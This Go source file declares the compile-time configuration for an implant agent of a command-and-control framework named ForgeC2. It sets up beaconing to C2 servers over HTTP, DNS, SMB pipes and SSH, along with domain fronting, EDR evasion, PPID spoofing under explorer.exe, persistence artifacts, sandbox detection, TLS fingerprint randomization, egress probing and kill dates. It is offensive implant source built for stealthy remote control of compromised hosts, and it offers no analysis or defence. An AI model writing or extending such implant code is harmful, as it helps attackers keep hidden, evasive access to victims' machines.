//go:build linux || windows || darwin
// +build linux windows darwin

package main

import "time"

// These variables are injected at compile time via -ldflags "-X main.C2URL=..."
// This source is used exclusively by the Generate Agent flow (EXE).
// IMPORTANT: -X can ONLY set string variables. Non-strings are injected as *Str and parsed in init().
var (
	C2URL                string   = "http://127.0.0.1:8080"
	C2URLs               []string // parsed from C2URL (comma-separated multi-C2 failover)
	currentC2Idx         int      // index of last working C2 server
	IntervalStr          string   = "10"
	JitterStr            string   = "20"
	UserAgent            string   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	PersistStr           string   = "false"
	SkipTLSVerifyStr     string   = "false" // default secure; change to "true" for self-signed C2 certs
	Protocol             string   = "http"  // "http" or "tcp" injected via ldflags
	DebugStr             string   = "false" // set via ldflags for debug builds (stealth default false)
	FastInterval         int      = 1       // Fast interval for screen monitoring (1 second)
	BeaconURIStr         string   = s(SBeaconURI)
	BeaconMethodStr      string   = s(SBeaconMethod)
	ListenerIDStr        string   = "0"
	P2PMode              string   = ""                            // "", "smb", "tcp"
	P2PParent            string   = ""                            // parent agent to connect to (child mode)
	P2PListenAddr        string   = ""                            // listen addr for children (parent mode)
	DNSDomain            string   = ""                            // DNS C2 domain (e.g. "c2.example.com")
	DNSServer            string   = ""                            // DNS C2 server IP
	DNSDoHURL            string   = ""                            // DNS-over-HTTPS endpoint (e.g. "https://dns.google/dns-query")
	DNSDoTAddr           string   = ""                            // DNS-over-TLS address:port (e.g. "1.1.1.1:853")
	DNSIPv6              bool     = false                         // enable IPv6 AAAA record tunneling
	ProxyStr             string   = ""                            // HTTP proxy URL (e.g. "http://proxy:8080")
	CryptoKeyStr         string   = ""                            // 32-byte hex key for beacon payload encryption ("" = disabled)
	DomainFront          string   = ""                            // Domain fronting: override HTTP Host header ("" = disabled)
	ContentLengthJitter  int      = 0                             // Max random padding bytes for HTTP body (0=disabled)
	ExpiryDateStr        string   = ""                            // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
	EvasionStr           string   = "false"                       // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
	PPIDSpoofStr         string   = "false"                       // Compile-time PPID spoofing (spawned processes inherit explorer.exe as parent)
	PersistencePrefixStr string   = ""                            // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
	BeaconTransportStr   string   = "http"                        // "http", "wss", "ssh" — transport protocol for beacon
	ChameleonStr         string   = "true"                        // enable uTLS TLS fingerprint randomization (requires chameleon build tag)
	ChameleonProfileStr  string   = "random"                      // chrome, firefox, ios, android, random
	SMBPipeName          string   = "forgec2"                     // named pipe name for SMB transport
	IsSMBParentStr       string   = "false"                       // "true" = this agent is an SMB parent (listens on pipe)
	SSHUserStr           string   = "forgec2"                     // SSH username for SSH transport
	SSHPasswordStr       string   = ""                            // SSH password for SSH transport
	SSHKeyStr            string   = ""                            // base64-encoded PEM private key for SSH transport
	SSHHostKeyStr        string   = ""                            // base64 server host public key (pin); empty = lab InsecureIgnoreHostKey
	EgressDetectionStr   string   = "false"                       // enable egress detection on startup
	EgressPortsStr       string   = "80,443,8080,8443,53,22,2222" // ports to test for egress

	// Certificate pinning (SHA-256 hex of server DER cert; empty = disabled)
	PinnedCertSHA256Str string = ""

	// mTLS transport
	MTLSCertStr string = "" // base64-encoded client certificate PEM for mTLS
	MTLSKeyStr  string = "" // base64-encoded client key PEM for mTLS
	MTLSCAStr   string = "" // base64-encoded CA certificate PEM for mTLS

	// WireGuard-style transport
	WGPrivateKeyStr   string = "" // base64-encoded 32-byte private key
	WGServerPublicStr string = "" // base64-encoded 32-byte server public key

	// Multi-C2 traffic splitting and failover
	C2ModeStr      string = s(SC2Mode) // "single", "failover", "roundrobin", "random", "split", "parallel"
	MaxRetriesStr  string = "10"       // max retries before entering dead mode
	DeadTimeoutStr string = "3600"     // seconds to wait before retrying dead C2s

	// P2P Mesh / Gossip Discovery
	GossipEnabledStr  string = "false" // enable gossip peer discovery
	GossipIntervalStr string = "30"    // seconds between gossip probes
	GossipListenAddr  string = ""      // gossip listen addr (defaults to P2PListenAddr+1)

	// Working Hours
	WorkingStartStr string = "" // HH:MM start of working hours (empty = disabled)
	WorkingEndStr   string = "" // HH:MM end of working hours (empty = disabled)
	WorkingTZStr    string = "" // IANA timezone (empty = UTC)

	// Per-Agent Kill Date
	KillDateStr string = "" // YYYY-MM-DD — agent self-destructs after this date (empty = disabled)

	// Binary integrity verification (SHA-256 hex of the running binary; empty = disabled)
	SelfCheckSHA256Str string = ""
)

// Parsed versions (populated in init)
var (
	Interval         int
	Jitter           int
	Persist          bool
	SkipTLSVerify    bool
	Debug            bool
	BeaconURI        string
	BeaconMethod     string
	ListenerID       uint
	BeaconTransport  string
	evasionEnabled   bool
	chameleonEnabled bool
	chameleonProfile string
	isSMBParent      bool
	smbPipeName      string // resolved SMB pipe name (from SMBPipeName or extracted from C2URL)
)

var beaconCipher *streamCipher // legacy XOR beacon encryption (nil = disabled)
var ecdhSess *ecdhSession      // ECDH session for forward-secret encryption (nil = not established)
var inSandbox bool             // set by sandbox detection at startup
var ppidSpoofEnabled bool      // PPID spoofing enabled via ldfags
var persistencePrefix string   // artifact name prefix for persistence (default "ForgeC2")
var egressDetection bool       // parsed from EgressDetectionStr
var AgentVersion = s(SAgentVersion)
var maxRetries int             // parsed from MaxRetriesStr
var deadTimeout time.Duration  // parsed from DeadTimeoutStr
var dnsConsecutiveFailures int // DNS beacon consecutive failure count
const dnsFallbackThreshold = 5 // fallback to HTTP after this many DNS failures

// Working hours runtime state
var (
	workingStart string // HH:MM start (from WorkingStartStr)
	workingEnd   string // HH:MM end (from WorkingEndStr)
	workingTZ    string // IANA timezone (from WorkingTZStr)
)

// Kill date runtime state
var killDateParsed time.Time // parsed from KillDateStr
